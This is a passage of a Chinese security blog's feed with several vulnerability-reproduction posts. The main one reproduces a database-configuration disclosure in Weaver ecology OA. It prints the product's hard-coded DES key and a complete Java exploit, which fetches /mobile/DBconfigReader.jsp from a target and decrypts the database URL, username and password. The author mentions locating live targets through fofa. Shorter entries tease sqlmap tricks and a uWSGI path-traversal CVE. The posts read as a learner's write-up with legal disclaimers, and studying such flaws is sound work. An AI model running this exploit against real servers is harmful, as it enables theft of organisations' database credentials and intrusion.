src="https://img-blog.csdnimg.cn/20191101162519505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="0x04-漏洞复现那些坑"><a href="#0x04-漏洞复现那些坑" class="headerlink" title="0x04 漏洞复现那些坑"></a>0x04 漏洞复现那些坑</h1><hr><h6 id="1-版本不对（或者是服务器请求处理机制不对，大佬是这个咋不懂，咋也不敢问），第一个坑。（由于我是直接使用fofa直接搜索，所以才会导致这个多坑）"><a href="#1-版本不对（或者是服务器请求处理机制不对，大佬是这个咋不懂，咋也不敢问），第一个坑。（由于我是直接使用fofa直接搜索，所以才会导致这个多坑）" class="headerlink" title="1. 版本不对（或者是服务器请求处理机制不对，大佬是这个咋不懂，咋也不敢问），第一个坑。（由于我是直接使用fofa直接搜索，所以才会导致这个多坑）"></a>1. 版本不对（或者是服务器请求处理机制不对，大佬是这个咋不懂，咋也不敢问），第一个坑。（由于我是直接使用fofa直接搜索，所以才会导致这个多坑）</h6><h2 id="-2"><a href="#-2" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20191031191642379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h2><h6 id="2-POST请求包里面的header不对，原因：因为我是我直接抓包，然后使用burpsuite修改请求包，然后导致这个结果，以至于我浪费了很多时间。"><a href="#2-POST请求包里面的header不对，原因：因为我是我直接抓包，然后使用burpsuite修改请求包，然后导致这个结果，以至于我浪费了很多时间。" class="headerlink" title="2. POST请求包里面的header不对，原因：因为我是我直接抓包，然后使用burpsuite修改请求包，然后导致这个结果，以至于我浪费了很多时间。"></a>2. POST请求包里面的header不对，原因：因为我是我直接抓包，然后使用burpsuite修改请求包，然后导致这个结果，以至于我浪费了很多时间。</h6><p><img src="https://img-blog.csdnimg.cn/2019103119200075.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191031192051496.png" alt="在这里插入图片描述"><br>今日又看了几篇关于这个文章，我也没有搞明白这个header头错误是什么情况。</p><p><img src="https://img-blog.csdnimg.cn/20191101163941564.png" alt="在这里插入图片描述"></p><hr><h5 id="3-数据包请求方法不对。（另一种说法是这个情况就是证明存在漏洞（来着土司某位大佬的见解））"><a href="#3-数据包请求方法不对。（另一种说法是这个情况就是证明存在漏洞（来着土司某位大佬的见解））" class="headerlink" title="3. 数据包请求方法不对。（另一种说法是这个情况就是证明存在漏洞（来着土司某位大佬的见解））"></a>3. 数据包请求方法不对。（另一种说法是这个情况就是证明存在漏洞（来着土司某位大佬的见解））</h5><p><img src="https://img-blog.csdnimg.cn/20191031192512678.png" alt="在这里插入图片描述"></p><hr><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</a></p><h1 id="0x06-免责声明"><a href="#0x06-免责声明" class="headerlink" title="0x06 免责声明"></a>0x06 免责声明</h1><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。<br>致谢：上上下下左左右右ba</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;﻿# 0x00 漏洞简介&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到X
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>[原]泛微ecology OA系统某接口存在数据库配置信息泄露漏洞exp-python</title>
    <link href="http://yoursite.com/2019/10/27/%E5%8E%9F-%E6%B3%9B%E5%BE%AEecology-OA%E7%B3%BB%E7%BB%9F%E6%9F%90%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Eexp-python/"/>
    <id>http://yoursite.com/2019/10/27/%E5%8E%9F-%E6%B3%9B%E5%BE%AEecology-OA%E7%B3%BB%E7%BB%9F%E6%9F%90%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Eexp-python/</id>
    <published>2019-10-27T10:51:48.000Z</published>
    <updated>2019-12-14T04:40:36.197Z</updated>
    
    <content type="html"><![CDATA[<p>本文只是记录，在土司论坛上看到的文章，学习大佬们的骚操作！</p><p>大佬们别看了，这个我只是记录的，不公开！</p><p>…                    <div><br>                        作者：sun1318578251 发表于 2019/10/27 18:51:48 <a href="https://blog.csdn.net/sun1318578251/article/details/102769903" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/102769903" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/102769903</a>                    </div><br>                    <div><br>                        阅读：529                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文只是记录，在土司论坛上看到的文章，学习大佬们的骚操作！&lt;/p&gt;
&lt;p&gt;大佬们别看了，这个我只是记录的，不公开！&lt;/p&gt;
&lt;p&gt;…                    &lt;div&gt;&lt;br&gt;                        作者：sun1318578251 发
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【漏洞复现】泛微ecology OA系统某接口存在数据库配置信息泄露漏洞</title>
    <link href="http://yoursite.com/2019/10/26/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E6%B3%9B%E5%BE%AEecology-OA%E7%B3%BB%E7%BB%9F%E6%9F%90%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/10/26/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E6%B3%9B%E5%BE%AEecology-OA%E7%B3%BB%E7%BB%9F%E6%9F%90%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-10-26T13:27:45.000Z</published>
    <updated>2020-03-24T07:23:54.062Z</updated>
    
    <content type="html"><![CDATA[<p><a href="#1">目前</a><br> &nbsp; &nbsp; <a href="#0x00"> 0x00 前言</a><br>&nbsp; &nbsp;  <a href="#0x01"> 0x01 漏洞简诉</a><br>&nbsp; &nbsp; <a href="#0x02"> 0x02 漏洞分析</a><br>&nbsp; &nbsp; <a href="#0x03"> 0x03 漏洞剖析</a><br>&nbsp; &nbsp; <a href="#0x04"> 0x04 漏洞复现</a><br>&nbsp; &nbsp; <a href="#0x05"> 0x05 复现那些泪水</a><br>&nbsp; &nbsp; <a href="#0x06"> 0x06 复现总结</a><br>&nbsp; &nbsp;<a href="#0x07"> 0x07 免责声明</a></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>漏洞被曝光有几天时间了。一直在上课没有时间写，昨天晚上整了一晚上，加上今天下午和学长搞了一下午才复现成功！<br>经过这次我意识到了会开发的重要性，我前前后后问了一堆人，百度了一堆问题！最后发现会开发能解决这一切问题！</p><p>各位看官且看下文分析！</p><hr><h1 id="0x01-漏洞简诉"><a href="#0x01-漏洞简诉" class="headerlink" title="0x01 漏洞简诉"></a>0x01 漏洞简诉</h1><p>漏洞涉及范围，用fofa搜索，看影响范围，还挺大的！</p><p>影响版本：包括不限于8.0、9.0版<br><img src="https://img-blog.csdnimg.cn/20191026195236165.png" alt="在这里插入图片描述"></p><hr><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>分析看源码[1]分析，sb字符串是url、user、password和logintype组成！<br>然后str是sb的字符串转成字节，（重点！！！）keyString是1z2x3c4v5b6n 。<br>keyByte是keyString转成字节而来！<br>dsk1 是 DESkeySpec 类对象。<br>接下去都是加密的过程！（说实话我现在还有点迷）<br><img src="https://img-blog.csdnimg.cn/20191026201547385.png" alt="在这里插入图片描述"></p><hr><p>经过上面一系列的操作，然后我访问使用payload访问目标站点，会看到是一堆由DES加密的乱码！<br><img src="https://img-blog.csdnimg.cn/20191026203344957.png" alt="在这里插入图片描述"></p><hr><h1 id="0x03-漏洞剖析"><a href="#0x03-漏洞剖析" class="headerlink" title="0x03 漏洞剖析"></a>0x03 漏洞剖析</h1><p>经过一系列的分析，不难发现利用这漏洞只要掌握两个要点！</p><ol><li><p>获取密钥，这点看不到源码的话是根本不可能实现的。但是我们可以根据上面源码默认密钥1z2x3c4v5b6n。</p></li><li><p>使用密钥解密DES密文！这个得去看看java如何实现DES加密解密算法，还要研究透DES算法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解密实现 源码来着https://www.cnblogs.com/itrena/p/9081056.html</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> src byte[]</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> password String</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> byte[]</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] src, String password) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">          <span class="comment">// DES算法要求有一个可信任的随机数源</span></span><br><span class="line">          SecureRandom random = <span class="keyword">new</span> SecureRandom();</span><br><span class="line">          <span class="comment">// 创建一个DESKeySpec对象</span></span><br><span class="line">          DESKeySpec desKey = <span class="keyword">new</span> DESKeySpec(password.getBytes());</span><br><span class="line">          <span class="comment">// 创建一个密匙工厂</span></span><br><span class="line">          SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">          <span class="comment">// 将DESKeySpec对象转换成SecretKey对象</span></span><br><span class="line">          SecretKey securekey = keyFactory.generateSecret(desKey);</span><br><span class="line">          <span class="comment">// Cipher对象实际完成解密操作</span></span><br><span class="line">          Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">          <span class="comment">// 用密匙初始化Cipher对象</span></span><br><span class="line">          cipher.init(Cipher.DECRYPT_MODE, securekey, random);</span><br><span class="line">          <span class="comment">// 真正开始解密操作</span></span><br><span class="line">          <span class="keyword">return</span> cipher.doFinal(src);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h1><p>昨天晚上经过大量实践分析，咨询之后！我还是失败了。<br>今天早上起来已经是中午。<br>像往常一样打开微信QQ看看亲友群[2]、朋友圈、QQ空间！<br>当我看到我这个漏洞圈子社区17小时之前有人已经发了exp[3]。我就迫不及待的去试试了！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClientBuilder;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.util.EntityUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadDbConfig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String DES = <span class="string">"DES"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String key = <span class="string">"1z2x3c4v5b6n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args[<span class="number">0</span>]!=<span class="keyword">null</span>&amp;&amp; args[<span class="number">0</span>].length() !=<span class="number">0</span>)&#123;</span><br><span class="line">            String url = args[<span class="number">0</span>]+<span class="string">"/mobile/DBconfigReader.jsp"</span>;</span><br><span class="line">            System.out.println(ReadConfig(url));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.err.print(<span class="string">"use: java -jar ecologyExp  http://127.0.0.1"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">ReadConfig</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        CloseableHttpClient httpClient = HttpClientBuilder.create().build();</span><br><span class="line">        HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">        CloseableHttpResponse response = httpClient.execute(httpGet);</span><br><span class="line">        HttpEntity responseEntity = response.getEntity();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] res1 = EntityUtils.toByteArray(responseEntity);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = subBytes(res1,<span class="number">10</span>,res1.length-<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span> [] finaldata =decrypt(data,key.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> String(finaldata));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] data, <span class="keyword">byte</span>[] key) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        SecureRandom sr = <span class="keyword">new</span> SecureRandom();</span><br><span class="line">        DESKeySpec dks = <span class="keyword">new</span> DESKeySpec(key);</span><br><span class="line">        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);</span><br><span class="line">        SecretKey securekey = keyFactory.generateSecret(dks);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(DES);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cipher.doFinal(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] subBytes(<span class="keyword">byte</span>[] src, <span class="keyword">int</span> begin, <span class="keyword">int</span> count) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bs = <span class="keyword">new</span> <span class="keyword">byte</span>[count];</span><br><span class="line">        System.arraycopy(src, begin, bs, <span class="number">0</span>, count);</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 看完之后，有点惊喜又有点失落。惊喜的是有完整的源码，但是没有jar。<br> 这个让我一个java菜鸟如何是好！我在求助了一个热心做开发的学长之后，经过我们不断试错！不断debug，终于完成了！<br> <img src="https://img-blog.csdnimg.cn/20191026205714833.png" alt="在这里插入图片描述"></p><h1 id="0x05-复现那些泪水"><a href="#0x05-复现那些泪水" class="headerlink" title="0x05 复现那些泪水"></a>0x05 复现那些泪水</h1><p>  千辛万苦解决一切bug之后首先遇见第一道坑！<br> <img src="https://img-blog.csdnimg.cn/20191026205813512.png" alt="在这里插入图片描述"></p><hr><p>第二道坑！<br> <img src="https://img-blog.csdnimg.cn/20191026210010365.png" alt="在这里插入图片描述"></p><h2 id><a href="#" class="headerlink" title=" "></a> <img src="https://img-blog.csdnimg.cn/2019102621010238.png" alt="在这里插入图片描述"></h2><p> 第三个坑！<br> 这个坑是这个网站使用不同的密钥导致的！（也就是密钥不是1z2x3c4v5b6n）</p><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> <img src="https://img-blog.csdnimg.cn/20191026210143314.png" alt="在这里插入图片描述"></h2><h1 id="0x06-复现总结"><a href="#0x06-复现总结" class="headerlink" title="0x06 复现总结"></a>0x06 复现总结</h1><ol><li>开发经验不足</li><li>接触太少加密算法</li><li>有一个开发朋友很重要</li><li>我的安全之路还有很长的路要走</li></ol><hr><h1 id="0x07-免责声明"><a href="#0x07-免责声明" class="headerlink" title="0x07 免责声明"></a>0x07 免责声明</h1><p>没有放出jar文件是因为最新安全发的缘故。请遵守《网络安全法》等相关法律法规。</p><hr><p>[1]源码来着360CET公共号：<a href="https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg</a><br>[2]亲友群：就是安全群。在不同安全群常常能见到很多相同的人，所以被称为亲友群。<br>[3]exp源码来着：<a href="https://www.secquan.org/BugWarning/1070442" target="_blank" rel="noopener">https://www.secquan.org/BugWarning/1070442</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;#1&quot;&gt;目前&lt;/a&gt;&lt;br&gt; &amp;nbsp; &amp;nbsp; &lt;a href=&quot;#0x00&quot;&gt; 0x00 前言&lt;/a&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp;  &lt;a href=&quot;#0x01&quot;&gt; 0x01 漏洞简诉&lt;/a&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &lt;a h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[原]About Me 关于我</title>
    <link href="http://yoursite.com/2019/10/24/%E5%8E%9F-About-Me-%E5%85%B3%E4%BA%8E%E6%88%91/"/>
    <id>http://yoursite.com/2019/10/24/%E5%8E%9F-About-Me-%E5%85%B3%E4%BA%8E%E6%88%91/</id>
    <published>2019-10-24T12:05:21.000Z</published>
    <updated>2019-12-14T04:40:36.197Z</updated>
    
    <content type="html"><![CDATA[<p>每一个评论我都会回复的，每一个评论我都会认真去看。</p><p>如果你觉得我这个菜逼弟弟文笔还不错的话可以点赞支持，你的一个赞就是我继续更新下去的动力和理由。如果可以的话，还恳请您的小手点一下关注。</p><p>微信：sun1318578251</p><p>本人创建了一个知识星球，里面有我收集的大量资料！</p><p>由于有人已经付费加入了，自从以后不在免费，对这个付费的人尊重。</p><p>…                    <div><br>                        作者：sun1318578251 发表于 2019/10/24 20:05:21 <a href="https://blog.csdn.net/sun1318578251/article/details/102730818" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/102730818" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/102730818</a>                    </div><br>                    <div><br>                        阅读：185                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;每一个评论我都会回复的，每一个评论我都会认真去看。&lt;/p&gt;
&lt;p&gt;如果你觉得我这个菜逼弟弟文笔还不错的话可以点赞支持，你的一个赞就是我继续更新下去的动力和理由。如果可以的话，还恳请您的小手点一下关注。&lt;/p&gt;
&lt;p&gt;微信：sun1318578251&lt;/p&gt;
&lt;p&gt;本人创建了
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[原]【实战技巧】sqlmap不为人知的骚操作</title>
    <link href="http://yoursite.com/2019/10/22/%E5%8E%9F-%E3%80%90%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E3%80%91sqlmap%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2019/10/22/%E5%8E%9F-%E3%80%90%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E3%80%91sqlmap%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</id>
    <published>2019-10-22T10:57:58.000Z</published>
    <updated>2019-12-14T04:40:36.197Z</updated>
    
    <content type="html"><![CDATA[<p>前言</p><p>如果有不知道这个漏洞，可以先看看下面的文章<br><a href="https://xz.aliyun.com/t/6531" target="_blank" rel="noopener">https://xz.aliyun.com/t/6531</a></p><p>0x01 注入前知识补充</p><p>sqlmap参数：–prefix,–suffix<br>在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。<br>例如，代码中是这样调用数据库的：<br>$query = “SELECT * FROM users WHERE id…                    <div><br>                        作者：sun1318578251 发表于 2019/10/22 18:57:58 <a href="https://blog.csdn.net/sun1318578251/article/details/102524100" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/102524100" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/102524100</a>                    </div><br>                    <div><br>                        阅读：3161 评论：3 <a href="https://blog.csdn.net/sun1318578251/article/details/102524100#comments" target="_blank" rel="noopener">查看评论</a>                    </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言&lt;/p&gt;
&lt;p&gt;如果有不知道这个漏洞，可以先看看下面的文章&lt;br&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6531&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6531&lt;/a&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[原]【墨者学院 】uWSGI 漏洞复现（CVE-2018-7490）</title>
    <link href="http://yoursite.com/2019/10/20/%E5%8E%9F-%E3%80%90%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E3%80%91uWSGI-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-7490%EF%BC%89/"/>
    <id>http://yoursite.com/2019/10/20/%E5%8E%9F-%E3%80%90%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E3%80%91uWSGI-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-7490%EF%BC%89/</id>
    <published>2019-10-20T13:16:40.000Z</published>
    <updated>2019-12-14T04:40:36.197Z</updated>
    
    <content type="html"><![CDATA[<p>0x01 漏洞详情<br>uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议。 uWSGI 2.0.17之前版本中存在路径遍历漏洞，该漏洞源于程序没有正确的处理DOCUMENT_ROOT检测。攻击者可通过发送带有‘…’序列的特制URL请求利用该漏洞查看系统上的任意文件。<br>uWSGI 2.0.17之前版本中存在路径遍历漏洞，该漏洞源于程序没有正确的处理DOCUMENT_RO…                    <div><br>                        作者：sun1318578251 发表于 2019/10/20 21:16:40 <a href="https://blog.csdn.net/sun1318578251/article/details/102653765" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/102653765" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/102653765</a>                    </div><br>                    <div><br>                        阅读：224                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;0x01 漏洞详情&lt;br&gt;uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议。 uWSGI 2.0.17之前版本中存在路径遍历漏洞，该漏洞源于程序没有正确的处理DOCUMENT_ROOT检测。攻击者可通过发送带有‘…’序列的特制URL请求利用
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
